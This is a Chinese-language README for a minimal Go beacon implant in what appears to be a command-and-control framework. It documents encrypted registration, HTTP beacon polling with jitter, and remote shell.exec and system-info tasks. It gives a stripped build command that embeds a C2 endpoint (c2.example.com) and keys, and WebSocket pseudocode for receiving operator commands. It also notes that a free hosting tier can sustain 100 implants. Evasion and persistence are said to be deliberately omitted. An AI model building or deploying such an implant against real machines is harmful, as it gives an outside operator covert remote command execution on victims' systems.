# clients/go —— 参考植入体（纯标准库）

> 这份代码的定位：**把协议跑通的最小实现**，不是产品级 implant。
> 它证明三件事：① 任何语言都能按 [协议规范](../../docs/03-protocol/01-envelope.md) 接进来；
> ② 服务端拿不到明文；③ 免自建服务器也能上线。

## 1. 它实现了什么

| 能力 | 状态 |
|---|---|
| `POST /v1/register`（PSK-HMAC + 公钥上报） | ✅ |
| ECDH P-256 + HKDF-SHA256 + AES-256-GCM | ✅（纯 stdlib，含手写 HKDF） |
| 操作员公钥**指纹校验**（防网关换 key） | ✅ |
| HTTP beacon 轮询（上行结果 + 下行任务） | ✅ |
| 心跳 + 抖动 + 指数退避重连 | ✅ |
| `shell.exec` / `sys.whoami` / `sys.info` | ✅ |
| `proc.list` / `file.*` / `shell.pty_*` | ❌ 参考实现留了分支，返回 "unsupported" |
| WebSocket 主通道 | ❌ 接口已留（`transport.go` 说明），换 `gorilla/websocket` 即可 |
| 文件分片（R2） | ❌ 未实现 |
| 内存加载 / 免杀 / 持久化 | ❌ 明确不做（那是载荷工程，不是协议问题） |

## 2. 构建

```bash
# 1) 从控制台「载荷」页创建，复制 config 里的 psk_id / psk / op_pub / op_fp
# 2) 注入配置（推荐：不落盘）
go build -trimpath -ldflags "-s -w \
  -X main.cfgEndpoint=https://c2.example.com \
  -X main.cfgPskId=<PSK_ID> \
  -X main.cfgPsk=<PSK> \
  -X main.cfgOpPub=<OP_PUB> \
  -X main.cfgOpFp=<OP_FP>" -o beacon .

# 3) 运行（会先注册，然后每 60s 心跳一次）
./beacon

# 4) 只想验证注册能不能过：
./beacon -once      # 打印 sid 与指纹
```

体积参考：`-s -w -trimpath` 后 **≈ 9.2 MB**（Go 1.26 / windows-amd64）。
想要更小就用 Rust/C（协议一样，见 [04-client](../../docs/04-client/01-implant-spec.md)）。

## 3. 调试用 config.json

```json
{
  "endpoint": "http://127.0.0.1:8788",
  "psk_id": "...",
  "psk": "...",
  "op_pub": "BAA...",
  "op_fp": "9f2c1a7b3d4e5f60",
  "hb": 30,
  "jitter": 0.2
}
```

> 本地联调时 endpoint 指向 **edge worker**（`wrangler dev` 的 8787），不是 console（8788）。

## 4. 换成 WebSocket 主通道

`beacon.beacon()` 换成"建连 → 循环读帧 → 结果写回"，帧格式完全相同（见
[docs/03-protocol/01-envelope.md](../../docs/03-protocol/01-envelope.md) §2）：

```go
// 伪代码
conn, _, _ := websocket.DefaultDialer.Dial(wsURL, http.Header{"Authorization": {"Bearer " + tok}})
conn.WriteMessage(websocket.TextMessage, mustJSON(hello))
for {
    _, msg, _ := conn.ReadMessage()
    switch f := decode(msg); f.T {
    case "cmd":  go handleTask(f)
    case "hb_ack": // ignore
    }
}
// 结果：conn.WriteMessage(websocket.TextMessage, mustJSON(resFrame))
```

心跳要用**固定字节串** `{"v":1,"t":"hb","seq":0}`，服务端 DO 的 `setWebSocketAutoResponse` 会直接回 pong，
**不唤醒对象、不计 duration**——这是免费额度能撑住 100 台的关键。

## 5. 不做的事（写清楚，避免误解）

- 不内置任何免杀/反调试/持久化逻辑：这些是"载荷工程"，与本框架的协议设计无关。
- 不实现自更新：控制台只托管二进制，更新由操作员重新投放。
- 不写日志到磁盘：出错只走 stderr。
